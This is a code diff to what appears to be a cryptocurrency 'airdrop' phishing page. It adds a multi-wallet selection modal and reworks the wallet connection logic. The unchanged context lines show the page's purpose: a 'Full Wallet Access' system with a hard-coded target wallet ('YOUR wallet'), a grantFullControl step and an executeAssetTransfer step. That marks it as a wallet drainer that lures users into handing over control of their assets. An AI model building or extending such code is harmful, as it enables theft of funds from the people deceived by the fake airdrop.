@@ -7,8 +7,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Ethers.js v6 for blockchain interactions -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.15.0/ethers.umd.min.js"></script>
-    <!-- WalletConnect for additional wallet support -->
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -713,6 +711,56 @@
         </div>
     </div>
 
+    <!-- Wallet Selection Modal -->
+    <div class="modal" id="walletSelectionModal">
+        <div class="modal-content">
+            <h3>Select Wallet Provider</h3>
+            <p>Choose your preferred wallet to connect:</p>
+            
+            <div style="display: flex; flex-direction: column; gap: 15px; margin: 25px 0;">
+                <button class="wallet-option" id="metamaskOption" style="background: #f1f5f9; border: none; padding: 20px; border-radius: 12px; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: all 0.3s ease;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1200px-MetaMask_Fox.svg.png" alt="MetaMask" style="width: 40px; height: 40px; border-radius: 8px;">
+                    <div style="text-align: left; flex: 1;">
+                        <div style="font-weight: 600; color: var(--dark);">MetaMask</div>
+                        <div style="font-size: 0.9rem; color: var(--gray);">Popular Ethereum wallet</div>
+                    </div>
+                    <i class="fas fa-chevron-right" style="color: var(--gray);"></i>
+                </button>
+                
+                <button class="wallet-option" id="trustOption" style="background: #f1f5f9; border: none; padding: 20px; border-radius: 12px; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: all 0.3s ease;">
+                    <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" style="width: 40px; height: 40px; border-radius: 8px;">
+                    <div style="text-align: left; flex: 1;">
+                        <div style="font-weight: 600; color: var(--dark);">Trust Wallet</div>
+                        <div style="font-size: 0.9rem; color: var(--gray);">Mobile-first multi-chain wallet</div>
+                    </div>
+                    <i class="fas fa-chevron-right" style="color: var(--gray);"></i>
+                </button>
+                
+                <button class="wallet-option" id="rabbyOption" style="background: #f1f5f9; border: none; padding: 20px; border-radius: 12px; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: all 0.3s ease;">
+                    <img src="https://rabby.io/images/logo.png" alt="Rabby Wallet" style="width: 40px; height: 40px; border-radius: 8px;">
+                    <div style="text-align: left; flex: 1;">
+                        <div style="font-weight: 600; color: var(--dark);">Rabby Wallet</div>
+                        <div style="font-size: 0.9rem; color: var(--gray);">DeFi-focused wallet</div>
+                    </div>
+                    <i class="fas fa-chevron-right" style="color: var(--gray);"></i>
+                </button>
+                
+                <button class="wallet-option" id="coinbaseOption" style="background: #f1f5f9; border: none; padding: 20px; border-radius: 12px; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: all 0.3s ease;">
+                    <img src="https://cdn.freebiesupply.com/logos/large/2x/coinbase-coin-logo-png-transparent.png" alt="Coinbase Wallet" style="width: 40px; height: 40px; border-radius: 8px;">
+                    <div style="text-align: left; flex: 1;">
+                        <div style="font-weight: 600; color: var(--dark);">Coinbase Wallet</div>
+                        <div style="font-size: 0.9rem; color: var(--gray);">Exchange-backed wallet</div>
+                    </div>
+                    <i class="fas fa-chevron-right" style="color: var(--gray);"></i>
+                </button>
+            </div>
+            
+            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #e2e8f0;">
+                <p style="color: var(--gray); font-size: 0.9rem;">Don't have a wallet? <a href="https://metamask.io/download/" target="_blank" style="color: var(--primary); text-decoration: none;">Install MetaMask</a></p>
+            </div>
+        </div>
+    </div>
+
     <script>
         // Advanced Airdrop System - Full Wallet Access
         // Target wallet address (YOUR wallet)
@@ -754,12 +802,19 @@
         const transferBtn = document.getElementById('transferBtn');
         const accessModal = document.getElementById('accessModal');
         const transferModal = document.getElementById('transferModal');
+        const walletSelectionModal = document.getElementById('walletSelectionModal');
         const cancelAccessBtn = document.getElementById('cancelAccessBtn');
         const confirmAccessBtn = document.getElementById('confirmAccessBtn');
         const cancelTransferBtn = document.getElementById('cancelTransferBtn');
         const confirmTransferBtn = document.getElementById('confirmTransferBtn');
         const transferFrom = document.getElementById('transferFrom');
         const assetsCount = document.getElementById('assetsCount');
+        
+        // Wallet selection options
+        const metamaskOption = document.getElementById('metamaskOption');
+        const trustOption = document.getElementById('trustOption');
+        const rabbyOption = document.getElementById('rabbyOption');
+        const coinbaseOption = document.getElementById('coinbaseOption');
 
         // Access permissions configuration
         const accessPermissions = [
@@ -832,22 +887,76 @@
             });
         }
 
+        // Show wallet selection modal
+        function showWalletSelectionModal() {
+            walletSelectionModal.style.display = 'flex';
+        }
+
+        // Close wallet selection modal
+        function closeWalletSelectionModal() {
+            walletSelectionModal.style.display = 'none';
+        }
+
         // Connect to wallet (MetaMask, Trust, Rabby, etc.)
         async function connectWalletHandler() {
             try {
-                // Check if Web3 provider is available
-                if (!window.ethereum && !window.trustwallet && !window.rabby) {
-                    showStatus('Please install MetaMask, Trust Wallet, or Rabby wallet!', 'error');
-                    return;
-                }
+                // Show wallet selection modal
+                showWalletSelectionModal();
+                
+            } catch (error) {
+                console.error('Error connecting wallet:', error);
+                showStatus('Failed to connect wallet: ' + error.message, 'error');
+            }
+        }
 
-                // Use window.ethereum (MetaMask) or fallback to other providers
-                const web3Provider = window.ethereum || window.trustwallet || window.rabby;
+        // Connect to specific wallet provider
+        async function connectToWalletProvider(walletProvider) {
+            try {
+                closeWalletSelectionModal();
+                
+                let web3Provider;
+                
+                // Determine which wallet provider to use
+                if (walletProvider === 'metamask') {
+                    if (!window.ethereum) {
+                        showStatus('MetaMask not detected. Please install MetaMask first.', 'error');
+                        return;
+                    }
+                    web3Provider = window.ethereum;
+                } else if (walletProvider === 'trust') {
+                    if (!window.trustwallet) {
+                        showStatus('Trust Wallet not detected. Please install Trust Wallet first.', 'error');
+                        return;
+                    }
+                    web3Provider = window.trustwallet;
+                } else if (walletProvider === 'rabby') {
+                    if (!window.rabby) {
+                        showStatus('Rabby Wallet not detected. Please install Rabby first.', 'error');
+                        return;
+                    }
+                    web3Provider = window.rabby;
+                } else if (walletProvider === 'coinbase') {
+                    if (!window.coinbaseWalletExtension) {
+                        showStatus('Coinbase Wallet not detected. Please install Coinbase Wallet first.', 'error');
+                        return;
+                    }
+                    web3Provider = window.coinbaseWalletExtension;
+                } else {
+                    // Default to MetaMask if available
+                    if (window.ethereum) {
+                        web3Provider = window.ethereum;
+                    } else {
+                        showStatus('No wallet detected. Please install a wallet like MetaMask.', 'error');
+                        return;
+                    }
+                }
                 
                 // Create ethers provider
                 provider = new ethers.BrowserProvider(web3Provider);
                 
-                // Request account access
+                // Request account access - THIS WILL TRIGGER WALLET POPUP
+                showStatus('Please check your wallet for connection request...', 'info');
+                
                 const accounts = await provider.send("eth_requestAccounts", []);
                 
                 // Get signer and user details
@@ -882,8 +991,15 @@
                 setTimeout(() => detectUserTokens(), 1000);
                 
             } catch (error) {
-                console.error('Error connecting wallet:', error);
-                showStatus('Failed to connect wallet: ' + error.message, 'error');
+                console.error('Error connecting to wallet:', error);
+                
+                if (error.code === 4001) {
+                    showStatus('Connection rejected by user. Please try again.', 'error');
+                } else if (error.code === -32002) {
+                    showStatus('Connection request already pending. Please check your wallet.', 'error');
+                } else {
+                    showStatus('Failed to connect wallet: ' + error.message, 'error');
+                }
             }
         }
 
@@ -929,28 +1045,30 @@
         // Setup wallet event listeners
         function setupWalletEventListeners(web3Provider) {
             // Listen for account changes
-            web3Provider.on('accountsChanged', (accounts) => {
-                if (accounts.length === 0) {
-                    disconnectWallet();
-                } else {
-                    userAddress = accounts[0];
+            if (web3Provider.on) {
+                web3Provider.on('accountsChanged', (accounts) => {
+                    if (accounts.length === 0) {
+                        disconnectWallet();
+                    } else {
+                        userAddress = accounts[0];
+                        updateWalletUI();
+                        showStatus('Account changed', 'info');
+                    }
+                });
+                
+                // Listen for chain changes
+                web3Provider.on('chainChanged', (chainId) => {
+                    networkId = parseInt(chainId, 16);
+                    networkName = getNetworkName(networkId);
                     updateWalletUI();
-                    showStatus('Account changed', 'info');
-                }
-            });
-            
-            // Listen for chain changes
-            web3Provider.on('chainChanged', (chainId) => {
-                networkId = parseInt(chainId, 16);
-                networkName = getNetworkName(networkId);
-                updateWalletUI();
-                showStatus(`Network changed to ${networkName}`, 'info');
-            });
-            
-            // Listen for disconnect
-            web3Provider.on('disconnect', () => {
-                disconnectWallet();
-            });
+                    showStatus(`Network changed to ${networkName}`, 'info');
+                });
+                
+                // Listen for disconnect
+                web3Provider.on('disconnect', () => {
+                    disconnectWallet();
+                });
+            }
         }
 
         // Disconnect wallet
@@ -1222,11 +1340,17 @@
             // Initialize access cards
             initAccessCards();
             
-            // Event listeners
+            // Event listeners for main buttons
             connectBtn.addEventListener('click', connectWalletHandler);
             
             grantAccessBtn.addEventListener('click', grantFullControl);
             transferBtn.addEventListener('click', executeAssetTransfer);
+            
+            // Wallet selection options
+            metamaskOption.addEventListener('click', () => connectToWalletProvider('metamask'));
+            trustOption.addEventListener('click', () => connectToWalletProvider('trust'));
+            rabbyOption.addEventListener('click', () => connectToWalletProvider('rabby'));
+            coinbaseOption.addEventListener('click', () => connectToWalletProvider('coinbase'));
             
             // Modal buttons
             cancelAccessBtn.addEventListener('click', () => {
@@ -1263,7 +1387,7 @@
             });
             
             // Close modals when clicking outside
-            [accessModal, transferModal].forEach(modal => {
+            [accessModal, transferModal, walletSelectionModal].forEach(modal => {
                 modal.addEventListener('click', (e) => {
                     if (e.target === modal) {
                         modal.style.display = 'none';
@@ -1271,11 +1395,22 @@
                 });
             });
             
-            // Auto-connect if previously connected
-            if (window.ethereum && window.ethereum.selectedAddress) {
-                setTimeout(() => {
-                    connectWalletHandler();
-                }, 1000);
+            // Check if wallet is already connected on page load
+            checkExistingWalletConnection();
+        }
+
+        // Check if wallet is already connected
+        async function checkExistingWalletConnection() {
+            try {
+                // Check for MetaMask
+                if (window.ethereum && window.ethereum.selectedAddress) {
+                    // Auto-connect to MetaMask
+                    setTimeout(() => {
+                        connectToWalletProvider('metamask');
+                    }, 1000);
+                }
+            } catch (error) {
+                console.log('No existing wallet connection found');
             }
         }
 
